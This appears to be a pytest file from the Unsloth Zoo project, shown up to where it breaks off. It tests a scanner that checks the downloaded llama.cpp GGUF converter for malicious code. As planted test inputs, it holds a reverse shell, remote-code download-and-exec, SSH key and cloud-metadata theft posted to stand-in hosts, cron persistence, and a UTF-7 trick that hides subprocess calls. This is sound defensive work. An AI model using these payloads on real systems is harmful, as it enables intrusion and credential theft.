# Unsloth Zoo - Utilities for Unsloth
# Copyright 2023-present Daniel Han-Chen, Michael Han-Chen & the Unsloth team. All rights reserved.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

"""Tests for the static scan of the downloaded llama.cpp converter.

Three groups:

  * clean_*     : the genuine converter must produce zero findings, offline
    against the committed fixture and, when the network is up, against live
    llama.cpp master. A check that fires on the real file would warn on every
    GGUF export and would have to be reverted, so this is the load-bearing case.
  * flagged_*   : planted payloads must be reported, including one aimed at the
    argparse default that `llama_cpp.py` eval()s in-process.
  * export_*    : the scan runs before the bytes are patched, written or run, and
    neither a scanner crash nor a finding can break a legitimate conversion.
"""

from __future__ import annotations

import importlib.util
import logging
import os
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
FIXTURES = Path(__file__).resolve().parent / "fixtures"
GENUINE_CONVERTER = FIXTURES / "convert_hf_to_gguf_master.py.txt"
CONVERTER_URL = (
    "https://github.com/ggerganov/llama.cpp/raw/refs/heads/master/convert_hf_to_gguf.py"
)


def _load(module_name, relative_path):
    """Load a module by path, without importing the unsloth_zoo package."""
    spec = importlib.util.spec_from_file_location(module_name, REPO_ROOT / relative_path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def scan():
    return _load("converter_scan_under_test", "unsloth_zoo/converter_scan.py")


@pytest.fixture
def llama_cpp():
    return _load("llama_cpp_under_test_converter_scan", "unsloth_zoo/llama_cpp.py")


@pytest.fixture(autouse = True)
def _default_scan_env(monkeypatch):
    """Neither switch is set on a normal run; do not inherit a developer's shell."""
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)


# ---------------------------------------------------------------------------
# The genuine converter must be clean.
# ---------------------------------------------------------------------------


def test_clean_fixture_exists():
    assert GENUINE_CONVERTER.is_file(), GENUINE_CONVERTER


def test_clean_genuine_converter_fixture_has_no_findings(scan):
    content = GENUINE_CONVERTER.read_bytes()
    findings = scan.scan_converter_source(content, "convert_hf_to_gguf.py")
    assert findings == [], [(f.severity, f.check, f.evidence) for f in findings]


def test_clean_genuine_converter_matches_no_individual_pattern(scan):
    """Stronger than "no findings": the real file is nowhere near any rule.

    Every finding is a combination of these patterns, so zero raw matches means
    the margin does not depend on which combinations happen to be wired up.
    """
    text = GENUINE_CONVERTER.read_text(encoding = "utf-8", errors = "replace")
    hits = sorted(
        name for name, pattern in scan.VENDORED_PATTERNS.items() if pattern.search(text)
    )
    assert hits == [], hits


def test_clean_live_upstream_converter_has_no_findings(scan):
    """Same assertion against current master. Skipped when offline or rate-limited.

    Follows tests/test_convert_hf_to_gguf_patcher.py: upstream moving is a real
    failure worth hearing about, an unreachable network is not.
    """
    requests = pytest.importorskip("requests")
    headers = {}
    if os.environ.get("GITHUB_TOKEN"):
        headers["Authorization"] = f"Bearer {os.environ['GITHUB_TOKEN']}"
    try:
        response = requests.get(CONVERTER_URL, timeout = 30, headers = headers)
    except requests.exceptions.RequestException as exc:
        pytest.skip(f"network unreachable: {exc}")
    if response.status_code in (403, 429, 500, 502, 503, 504):
        pytest.skip(f"upstream rate-limited / unavailable: HTTP {response.status_code}")
    # A 404 is not an outage: it means the URL llama_cpp.py downloads from is gone,
    # which breaks GGUF export whatever this scan does. Fail rather than go green.
    assert response.status_code == 200, (
        f"{CONVERTER_URL} returned HTTP {response.status_code}. "
        f"LLAMA_CPP_CONVERT_FILE needs updating."
    )
    findings = scan.scan_converter_source(response.content, CONVERTER_URL)
    assert findings == [], (
        "live llama.cpp master trips the converter scan, which would warn on every "
        f"GGUF export: {[(f.severity, f.check, f.evidence) for f in findings]}"
    )


def test_clean_ordinary_converter_shaped_script_has_no_findings(scan):
    """A converter doing normal converter things stays quiet."""
    source = b"""
import argparse, os, sys, json
from pathlib import Path
import torch
import gguf

if 'NO_LOCAL_GGUF' not in os.environ:
    sys.path.insert(1, str(Path(__file__).parent / 'gguf-py'))

def parse_args():
    parser = argparse.ArgumentParser(description="convert a model")
    parser.add_argument("--outtype", type=str, default="f16")
    parser.add_argument("--bigendian", action="store_true")
    parser.add_argument("--split-max-tensors", type=int, default=0)
    parser.add_argument("--model-name", type=str, default=None)
    return parser.parse_args()

def main():
    args = parse_args()
    for path in sorted(Path(args.model).glob("*.safetensors")):
        with open(path, "rb") as f:
            data = f.read(8)
    self_metadata = gguf.Metadata.load(None, None, None)
"""
    assert scan.scan_converter_source(source, "convert_hf_to_gguf.py") == []


# ---------------------------------------------------------------------------
# Planted payloads must be reported.
# ---------------------------------------------------------------------------

_PAYLOADS = {
    "staged base64 payload": (
        b"import base64, subprocess\n"
        b"blob = base64.b64decode('aW1wb3J0IG9z')\n"
        b"subprocess.run(['sh', '-c', blob])\n",
        "base64 decode + subprocess execution (staged payload)",
    ),
    "remote code execution": (
        b"import requests\n"
        b"exec(requests.get('http://example.invalid/p').text)\n",
        "Downloads and executes remote code",
    ),
    "credential stealer": (
        b"import requests, os\n"
        b"key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        b"requests.post('http://example.invalid/collect', data=key)\n",
        "Reads credential paths AND makes network calls",
    ),
    "reverse shell": (
        b"import socket, subprocess\n"
        b"s = socket.socket()\n"
        b"s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n",
        "Reverse shell / bind shell pattern",
    ),
    "environment harvest": (
        b"import os, requests\n"
        b"requests.post('http://example.invalid/e', json=dict(os.environ))\n",
        "Harvests environment variables/secrets AND makes network calls",
    ),
    "staged dropper": (
        b"open('/tmp/payload.sh', 'w').write(data)\n"
        b"import subprocess; subprocess.run(['sh', '/tmp/payload.sh'])\n",
        "Writes to /tmp and executes (staged dropper)",
    ),
    "persistence backdoor": (
        b"import requests\n"
        b"open('/etc/cron.d/unsloth', 'w').write(requests.get('http://example.invalid/c').text)\n",
        "Installs persistence AND makes network calls (backdoor pattern)",
    ),
    "cloud metadata theft": (
        b"import requests\n"
        b"t = requests.get('http://169.254.169.254/latest/meta-data/iam/').text\n"
        b"requests.post('http://example.invalid/t', data=t)\n",
        "Accesses cloud metadata/IMDS AND makes network calls",
    ),
    "marshal obfuscation": (
        b"import marshal\n"
        b"exec(marshal.loads(blob))\n",
        "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
    ),
}


@pytest.mark.parametrize("name", sorted(_PAYLOADS))
def test_flagged_payload_is_reported(scan, name):
    source, expected_check = _PAYLOADS[name]
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    checks = [f.check for f in findings]
    assert expected_check in checks, checks
    reported = [f for f in findings if f.check == expected_check]
    assert reported[0].severity in (scan.CRITICAL, scan.HIGH)
    assert reported[0].evidence.strip(), reported


def test_flagged_payload_hidden_in_a_real_converter_is_still_reported(scan):
    """The realistic shape: upstream's file with a few lines appended."""
    source = GENUINE_CONVERTER.read_bytes() + (
        b"\n\nimport base64, subprocess\n"
        b"subprocess.check_output(base64.b64decode('ZWNobyBoaQ=='), shell=True)\n"
    )
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert any("staged payload" in f.check for f in findings), [f.check for f in findings]


def test_flagged_findings_carry_evidence(scan):
    source, _ = _PAYLOADS["staged base64 payload"]
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert findings
    assert all(f.evidence.strip() for f in findings), findings
    assert any("L" in f.evidence for f in findings), findings


# ---------------------------------------------------------------------------
# The argparse default that reaches eval() in the Unsloth process.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "default",
    [
        b"{'a':1}['a']",
        b"sys.modules['os'].environ",
        b"__builtins__.__dict__['eval']",
    ],
)
def test_flagged_argparse_default_that_would_evaluate(scan, default):
    """What survives the capture and still evaluates: subscripts and lookups."""
    source = b'parser.add_argument("--outtype", type=str, default=' + default + b")\n"
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    argparse_findings = [f for f in findings if "argparse default" in f.check]
    assert argparse_findings, [f.check for f in findings]
    assert all(f.severity == scan.CRITICAL for f in argparse_findings)
    assert all(default.decode() in f.evidence for f in argparse_findings)


@pytest.mark.parametrize(
    "default",
    [
        # Every token upstream has actually used.
        b'"f16"', b'"auto"', b'"0"', b"0", b"None", b'"store_true"',
        # Plain names, which have no call syntax to invoke.
        b"DEFAULT_OUTTYPE", b"gguf.LlamaFileType",
        # Benign defaults the capture regex truncates. `[0, 1]` arrives as `[0`
        # and `os.cpu_count()` as `os.cpu_count(`, neither of which parses, so
        # eval() raises inside llama_cpp.py's own try/except and nothing runs.
        # Reporting these would warn on a converter that did nothing wrong.
        b"[0, 1]", b"(1, 2)", b'"chat template"', b"os.cpu_count()", b"Path.cwd()",
        b"globals()['os']", b"argparse.SUPPRESS", b"[]", b"{}",
    ],
)
def test_clean_argparse_default_that_cannot_run_is_quiet(scan, default):
    source = b'parser.add_argument("--outtype", type=str, default=' + default + b")\n"
    findings = [
        f for f in scan.scan_converter_source(source, "x.py") if "argparse" in f.check
    ]
    assert findings == [], findings


def test_clean_truncated_defaults_match_what_llama_cpp_does_with_them(scan, llama_cpp):
    """The tokens the rule stays quiet about are exactly the ones eval() rejects.

    Not an assumption: the capture runs, then each token is put through the same
    eval() llama_cpp.py performs, and the quiet ones must be the ones that raise.
    """
    source = (
        b'parser.add_argument("--a", default=[0, 1])\n'
        b'parser.add_argument("--b", default=os.cpu_count())\n'
        b'parser.add_argument("--c", default="chat template")\n'
    )
    tokens = [d.decode() for _flag, d in llama_cpp.RE_ARGPARSE_DEFAULT.findall(source)]
    assert tokens == ["[0", "os.cpu_count(", '"chat'], tokens
    for token in tokens:
        with pytest.raises(SyntaxError):
            eval(token)  # noqa: S307 - the point is that this raises
    assert [f for f in scan.scan_converter_source(source, "x.py") if "argparse" in f.check] == []


def test_argparse_regex_is_the_one_llama_cpp_evals(scan, llama_cpp):
    """The scan and the eval sink read the same tokens.

    Asserted on the pattern text and flags rather than object identity: the
    fixtures load both modules by path, so llama_cpp.py takes its ImportError
    fallback and builds a second module object. In a normal package import the
    two are the same object; either way what matters is that the regex agrees.
    """
    assert llama_cpp.RE_ARGPARSE_DEFAULT.pattern == scan.RE_ARGPARSE_DEFAULT.pattern
    assert llama_cpp.RE_ARGPARSE_DEFAULT.flags == scan.RE_ARGPARSE_DEFAULT.flags


def test_argparse_regex_still_matches_what_the_flag_parser_expects(scan):
    """Pinned to the exact pattern the defaults scraper used before it moved here.

    Moving the regex out of llama_cpp.py must not change which flags Unsloth
    resolves defaults for, so the text is pinned rather than tidied.
    """
    expected = (
        rb"parser\.add_argument\([\s]*[\"\']([^\"\']{1,})[\'\"]"
        rb"[^\)]*(?:action=|default=)[\s]*([^,\s\)]+)"
    )
    assert scan.RE_ARGPARSE_DEFAULT.pattern == expected
    source = (
        b'    parser.add_argument("--outtype", type=str, default="f16")\n'
        b'    parser.add_argument("--bigendian", action="store_true")\n'
    )
    assert scan.RE_ARGPARSE_DEFAULT.findall(source) == [
        (b"--outtype", b'"f16"'),
        (b"--bigendian", b'"store_true"'),
    ]


# ---------------------------------------------------------------------------
# Warn, do not block, unless asked to block.
# ---------------------------------------------------------------------------


def test_warning_names_the_rule_the_source_and_the_escape_hatch(scan, caplog):
    source, expected_check = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        findings = scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    assert findings
    text = caplog.text
    assert CONVERTER_URL in text
    assert expected_check in text
    assert "UNSLOTH_LLAMA_CPP_SCRIPTS_DIR" in text
    assert "UNSLOTH_CONVERTER_SCAN_STRICT" in text


def test_warning_does_not_raise_by_default(scan):
    source, _ = _PAYLOADS["reverse shell"]
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL)


def test_clean_converter_logs_nothing(scan, caplog):
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(GENUINE_CONVERTER.read_bytes(), CONVERTER_URL) == []
    assert caplog.text == ""


def test_strict_mode_refuses_a_downloaded_converter(scan, monkeypatch):
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with pytest.raises(scan.ConverterScanError) as excinfo:
        scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    assert CONVERTER_URL in str(excinfo.value)


def test_strict_mode_still_allows_a_deliberately_supplied_local_converter(scan, monkeypatch, caplog):
    """The warning tells people to pin a converter with
    UNSLOTH_LLAMA_CPP_SCRIPTS_DIR. Hard-failing that file would break the
    remedy, so a local copy warns even under strict mode."""
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        findings = scan.warn_on_suspicious_converter(
            source, "/home/me/llama.cpp/convert_hf_to_gguf.py", is_local_copy = True,
        )
    assert findings
    assert "/home/me/llama.cpp/convert_hf_to_gguf.py" in caplog.text


def test_scan_can_be_disabled(scan, monkeypatch, caplog):
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(source, CONVERTER_URL) == []
    assert caplog.text == ""


def test_disable_switch_is_read_per_call(scan, monkeypatch):
    """Not cached at import, so a caller can set it before the first export."""
    source, _ = _PAYLOADS["reverse shell"]
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL) == []


# ---------------------------------------------------------------------------
# A broken scanner must not break a conversion.
# ---------------------------------------------------------------------------


def test_scanner_crash_is_reported_and_swallowed(scan, monkeypatch, caplog):
    def _boom(*args, **kwargs):
        raise ValueError("catastrophic backtracking")

    monkeypatch.setattr(scan, "scan_converter_source", _boom)
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(b"anything", CONVERTER_URL) == []
    assert "could not run" in caplog.text
    assert "catastrophic backtracking" in caplog.text


def test_scanner_crash_guard_does_not_swallow_a_strict_refusal(scan, monkeypatch):
    """The guard wraps the scan only. A deliberate refusal still propagates."""
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with pytest.raises(scan.ConverterScanError):
        scan.warn_on_suspicious_converter(source, CONVERTER_URL)


def test_undecodable_bytes_do_not_crash_the_scan(scan):
    assert scan.scan_converter_source(b"\xff\xfe\x00bad bytes\n", "x.py") == []


def test_a_declared_encoding_is_what_the_scan_reads(scan):
    """The file gets to choose how the interpreter decodes it, so the scan has to
    read the same characters.

    `# coding: utf-7` on line one makes
    `+AHM-+AHU-+AGI-+AHA-+AHI-+AG8-+AGM-+AGU-+AHM-+AHM-.run(...)` the source text
    `subprocess.run(...)`. Decoded as UTF-8 that is plus signs and capitals,
    matching nothing, while the file Unsloth writes and executes spawns the
    process. Verified against the scanner as it stood: zero findings.
    """
    import base64

    shifted = "".join(
        "+" + base64.b64encode(ch.encode("utf-16-be")).decode().rstrip("=") + "-"
        for ch in "subprocess"
    )
    source = ("# coding: utf-7\n" + shifted + ".run(['curl', 'http://evil'])\n").encode("ascii")
    assert source.decode("utf-7").find("subprocess.run") != -1, "the probe is not shifted"

    checks = [finding.check for finding in scan.scan_converter_source(source)]
    assert any("process" in check.lower() for check in checks), checks
    assert any("encoding" in check.lower() for check in checks), checks


def test_a_plain_utf8_converter_says_nothing_about_encoding(scan):
    """The other half: an ordinary converter must not grow an encoding finding."""
    source = b"import json\nprint(json.dumps({}))\n"
    checks = [finding.check for finding in scan.scan_converter_source(source)]
    assert not [check for check in checks if "encoding" in check.lower()], checks


def test_scan_cap_leaves_room_for_the_largest_real_converter(scan):
    assert scan.MAX_SCAN_BYTES > 500 * 1024


def test_oversized_input_reports_that_it_was_only_partly_scanned(scan, monkeypatch):
    """Past the cap the tail is not scanned, and that has to be said out loud.

    The whole file is still patched, written and executed, so a silent partial
    scan would look exactly like a clean one.
    """
    monkeypatch.setattr(scan, "MAX_SCAN_BYTES", 2048)
    payload, expected_check = _PAYLOADS["reverse shell"]
    head = payload + b"# pad\n" * 1000
    findings = scan.scan_converter_source(head, "x.py")
    checks = [f.check for f in findings]
    assert expected_check in checks, checks
    assert any("larger than the scan cap" in c for c in checks), checks

    # Same payload past the cap: missed, which is what the cap finding warns about.
    tail = b"# pad\n" * 1000 + payload
    checks = [f.check for f in scan.scan_converter_source(tail, "x.py")]
    assert expected_check not in checks, checks
    assert any("larger than the scan cap" in c for c in checks), checks


def test_within_the_cap_nothing_is_reported_about_truncation(scan):
    findings = scan.scan_converter_source(GENUINE_CONVERTER.read_bytes(), "x.py")
    assert not any("scan cap" in f.check for f in findings), findings


# ---------------------------------------------------------------------------
# The whole-file patterns must not be stallable by the bytes they scan.
# ---------------------------------------------------------------------------


def test_pattern_evaluation_agrees_with_the_pinned_patterns(scan):
    """Fuzz the linear-time evaluation against `pattern.search` itself.

    Several canonical patterns are shaped `A.*B.*C` under DOTALL and are
    evaluated as ordered searches instead of one backtracking match. That is only
    allowed if it answers the same question, so 8000 texts assembled from the
    tokens those patterns key on are put through both, for all 23 patterns.
    """
    import random

    tokens = [
        "socket", ".connect", "subprocess", "sh", "bash", "cmd", "/bin/sh",
        "pty.spawn", "os.dup2", "platform.system", "if", "Linux", "Windows",
        "Darwin", "while True", "time.sleep", "urlopen", "requests.get",
        "chr(1)", "marshal.loads", "b64decode(", "history", "read", "/tmp/x",
        "os.system", "chmod", "+x", "rotate=", "lambda", "bytearray([1])",
        "RSA PUBLIC KEY", "MIIabcdefghijklmnopqrstu", "open('~/.ssh/id_rsa')",
        "tarfile.open(", ".env", "virtualbox", "hardware", "vmware", "detect",
        "Popen", "open(", "(", ")", "[", "]", "=", "\n", "  ", "x", "dig ",
        "nslookup", "os.environ", "TOKEN", "zlib.decompress", "169.254.169.254",
        "/etc/cron", "docker run", "wallet.dat", "openssl enc", "exec(", ".text(",
    ]
    rng = random.Random(31337)
    mismatches = []
    for _ in range(8000):
        text = "".join(rng.choice(tokens) for _ in range(rng.randint(1, 50)))
        for name, pattern in scan.VENDORED_PATTERNS.items():
            if scan._matches(pattern, text) != bool(pattern.search(text)):
                mismatches.append((name, text))
    assert mismatches == [], mismatches[:3]


@pytest.mark.parametrize(
    "name,filler",
    [
        ("RE_REVERSE_SHELL", "socket\n.connect\n"),
        ("RE_ANTI_ANALYSIS", "platform.system()\nif x:\n"),
        ("RE_C2_POLLING", "while True\ntime.sleep(\n"),
        ("RE_CRED_ACCESS", "open(aaaaaaaaaa\n"),
        ("RE_TEMP_EXEC", "/tmp/aaaa\n"),
        ("RE_OBFUSCATION", "chr(1)\n"),
        ("RE_FS_ENUM", "history\n"),
    ],
)
def test_hostile_input_cannot_stall_a_pattern(scan, name, filler):
    """A file of near-misses used to take 68s on one pattern and grew cubically.

    The converter bytes are the untrusted input, so a pattern that a crafted file
    can stall is a way to wedge every GGUF export, and a hang is the one failure
    the try/except around the scan cannot catch.
    """
    import time

    text = filler * (200 * 1024 // len(filler))
    pattern = scan.VENDORED_PATTERNS[name]
    started = time.perf_counter()
    scan._matches(pattern, text)
    assert time.perf_counter() - started < 5.0


def test_hostile_file_scans_in_reasonable_time(scan):
    import time

    hostile = (
        "socket\n.connect\nwhile True\ntime.sleep(\nplatform.system()\nif y:\n"
        "chr(1)\nhistory\n/tmp/a\nopen(aaa\nexec(aaa\n.add(aaa\nRSA PUBLIC KEY\n"
        "bytearray([1])\nrotate=\nlambda\nos.environ KEY\n"
    ) * 3000
    started = time.perf_counter()
    scan.scan_converter_source(hostile, "x.py")
    assert time.perf_counter() - started < 10.0


def test_one_enormous_line_does_not_stall_evidence_extraction(scan):
    """Evidence is line-scoped, which is only a bound if lines are bounded."""
    import time

    source = ("socket " + "a" * 200000 + " .connect subprocess\n").encode()
    started = time.perf_counter()
    findings = scan.scan_converter_source(source, "x.py")
    assert time.perf_counter() - started < 10.0
    assert any("Reverse shell" in f.check for f in findings), [f.check for f in findings]


# ---------------------------------------------------------------------------
# Wiring into the export path.
# ---------------------------------------------------------------------------

_MINIMAL_CONVERTER = b"""\
import argparse
import gguf

class ModelBase:
    def __init__(self):
        self.metadata = gguf.Metadata.load(None, None, None)
        n_experts = self.hparams["num_experts"]

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("model", type=str)
    parser.add_argument("--outfile", type=str, default=None)
    parser.add_argument("--outtype", type=str, default="f16")
    return parser.parse_args()
"""


def _run_patcher(llama_cpp, tmp_path, monkeypatch, converter_bytes):
    """Drive the patcher off a local converter, writing only inside tmp_path."""
    scripts_dir = tmp_path / "llama.cpp"
    scripts_dir.mkdir()
    converter = scripts_dir / "convert_hf_to_gguf.py"
    converter.write_bytes(converter_bytes)
    stat = converter.stat()
    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()
    return llama_cpp._download_convert_hf_to_gguf_cached(
        "unsloth_convert_hf_to_gguf",
        (str(converter), stat.st_mtime_ns, stat.st_size),
        None,
    )


def test_export_scans_before_writing_the_patched_script(llama_cpp, tmp_path, monkeypatch):
    """The scan must see the bytes before they are patched, written or run."""
    seen = {}

    def _record(content, source, is_local_copy = False, log = None):
        seen["content"] = content
        seen["source"] = source
        seen["is_local_copy"] = is_local_copy
        seen["patched_exists"] = os.path.exists(
            os.path.join(str(tmp_path / "llama.cpp"), "unsloth_convert_hf_to_gguf.py")
        )
        return []

    monkeypatch.setattr(llama_cpp, "warn_on_suspicious_converter", _record)
    patched, _text, _vision = _run_patcher(
        llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
    )
    assert seen["content"] == _MINIMAL_CONVERTER, "scan saw patched or truncated bytes"
    assert seen["patched_exists"] is False, "patched script existed before the scan ran"
    # A converter sitting in the llama.cpp directory with no prebuilt marker and
    # no UNSLOTH_LLAMA_CPP_SCRIPTS_DIR pin is not one the user chose, so it does
    # not get the strict-mode exemption. See the trusted-local tests below.
    assert seen["is_local_copy"] is False
    assert seen["source"].endswith("convert_hf_to_gguf.py")
    assert os.path.isfile(patched)


def test_export_survives_a_scanner_that_raises(llama_cpp, tmp_path, monkeypatch):
    """A bug in the scan cannot take down a legitimate conversion."""
    scan_module = _load("converter_scan_for_export", "unsloth_zoo/converter_scan.py")

    def _boom(*args, **kwargs):
        raise RuntimeError("scanner bug")

    monkeypatch.setattr(scan_module, "scan_converter_source", _boom)
    monkeypatch.setattr(
        llama_cpp, "warn_on_suspicious_converter", scan_module.warn_on_suspicious_converter,
    )
    patched, _text, _vision = _run_patcher(
        llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
    )
    assert os.path.isfile(patched)


def test_export_of_a_clean_local_converter_is_unchanged(llama_cpp, tmp_path, monkeypatch, caplog):
    with caplog.at_level("WARNING"):
        patched, _text, _vision = _run_patcher(
            llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
        )
    assert os.path.isfile(patched)
    assert "suspicious pattern" not in caplog.text


def test_export_strict_mode_refuses_a_downloaded_converter_and_writes_nothing(
    llama_cpp, tmp_path, monkeypatch,
):
    """Drives the real export path with downloaded bytes and strict mode set.

    Covers the `except ConverterScanError: raise` clause: the refusal must keep
    its own message rather than come back relabelled as an introspection failure,
    and no patched script may reach disk.
    """
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    payload = _MINIMAL_CONVERTER + (
        b"\nimport socket, subprocess\n"
        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
    )

    class _Response:
        content = payload

        def raise_for_status(self):
            return None

    scripts_dir = tmp_path / "llama.cpp"
    scripts_dir.mkdir()
    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
    monkeypatch.setattr(llama_cpp.requests, "get", lambda *a, **k: _Response())
    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()

    with pytest.raises(llama_cpp.ConverterScanError) as excinfo:
        llama_cpp._download_convert_hf_to_gguf_cached(
            "unsloth_convert_hf_to_gguf", None, None,
        )
    message = str(excinfo.value)
    assert "Refusing to run" in message
    assert "loading/introspection" not in message
    assert not (scripts_dir / "unsloth_convert_hf_to_gguf.py").exists()


def test_export_of_a_downloaded_converter_is_not_refused_without_strict_mode(
    llama_cpp, tmp_path, monkeypatch, caplog,
):
    """Same flagged download, strict mode unset: warn and carry on."""
    payload = _MINIMAL_CONVERTER + (
        b"\nimport socket, subprocess\n"
        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
    )

    class _Response:
        content = payload

        def raise_for_status(self):
            return None

    scripts_dir = tmp_path / "llama.cpp"
    scripts_dir.mkdir()
    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
    monkeypatch.setattr(llama_cpp.requests, "get", lambda *a, **k: _Response())
    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()

    with caplog.at_level("WARNING"):
        patched, _text, _vision = llama_cpp._download_convert_hf_to_gguf_cached(
            "unsloth_convert_hf_to_gguf", None, None,
        )
    assert os.path.isfile(patched)
    assert "suspicious pattern" in caplog.text
    assert CONVERTER_URL in caplog.text


def test_export_warns_but_completes_on_a_flagged_local_converter(
    llama_cpp, tmp_path, monkeypatch, caplog,
):
    payload = _MINIMAL_CONVERTER + (
        b"\nimport socket, subprocess\n"
        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
    )
    with caplog.at_level("WARNING"):
        patched, _text, _vision = _run_patcher(llama_cpp, tmp_path, monkeypatch, payload)
    assert "suspicious pattern" in caplog.text
    assert "Reverse shell" in caplog.text
    assert os.path.isfile(patched), "a warning must not block the export"


def test_only_a_pinned_converter_is_exempt_from_strict_mode(tmp_path, monkeypatch):
    """The exemption means "you chose this file", not "this file is on disk".

    When no prebuilt is available install_llama_cpp falls back to an unpinned
    git clone of upstream master, and _resolve_bundle_convert_script accepts that
    checkout on the strength of a conversion/ package alone. Treating it as a
    local copy let a suspicious converter fetched automatically from upstream be
    warned about but never refused, even under strict mode.
    """
    llama_cpp = _load("llama_cpp_trust_probe", "unsloth_zoo/llama_cpp.py")

    clone = tmp_path / "clone"
    clone.mkdir()
    script = clone / "convert_hf_to_gguf.py"
    script.write_text("# converter\n")

    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)
    assert llama_cpp._converter_is_trusted_local(str(script)) is False, (
        "a bare checkout must not be exempt"
    )

    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", str(clone))
    assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
        "an explicit pin is a deliberate user choice"
    )

    assert llama_cpp._converter_is_trusted_local(None) is False


def test_a_nested_module_in_the_conversion_package_is_scanned(tmp_path, monkeypatch):
    """os.listdir saw immediate children only.

    A clean `conversion/__init__.py` doing `from .nested import x` fronted
    `conversion/nested/__init__.py`, which was neither scanned nor counted
    against the cap, and Python imported and ran it just the same.
    """
    llama_cpp = _load("llama_cpp_nested_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    nested = root / "conversion" / "nested"
    nested.mkdir(parents = True)
    (root / "conversion" / "__init__.py").write_text(
        "from .nested import payload\n", encoding = "utf-8",
    )
    (nested / "__init__.py").write_text(
        "import subprocess\nsubprocess.run(['curl', 'http://evil'])\n",
        encoding = "utf-8",
    )

    assert "nested/__init__.py" in llama_cpp._conversion_package_modules(
        str(root / "conversion")
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_nested_module_moves_the_patcher_cache_key(tmp_path):
    """The key has to cover the same set the scan reads, or a changed nested
    module is invisible to both."""
    llama_cpp = _load("llama_cpp_nested_key_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    nested = root / "conversion" / "nested"
    nested.mkdir(parents = True)
    (root / "conversion" / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    (root / "conversion" / "base.py").write_text("Y = 1\n", encoding = "utf-8")
    deep = nested / "helper.py"
    deep.write_text("Z = 1\n", encoding = "utf-8")

    before = llama_cpp._conversion_sibling_info(str(root))
    assert before is not None
    deep.write_text("Z = 2  # and a payload\n", encoding = "utf-8")
    assert llama_cpp._conversion_sibling_info(str(root)) != before


def test_an_oversized_conversion_package_is_reported_not_silently_truncated(
    tmp_path, monkeypatch, caplog
):
    """Scanning only the first MAX names let a payload hide past the cap.

    A package can put its payload in a late-sorting module and import it from an
    otherwise clean __init__.py; with the list silently truncated, strict mode
    executed the unscanned module with nothing reported at all. The cap stays --
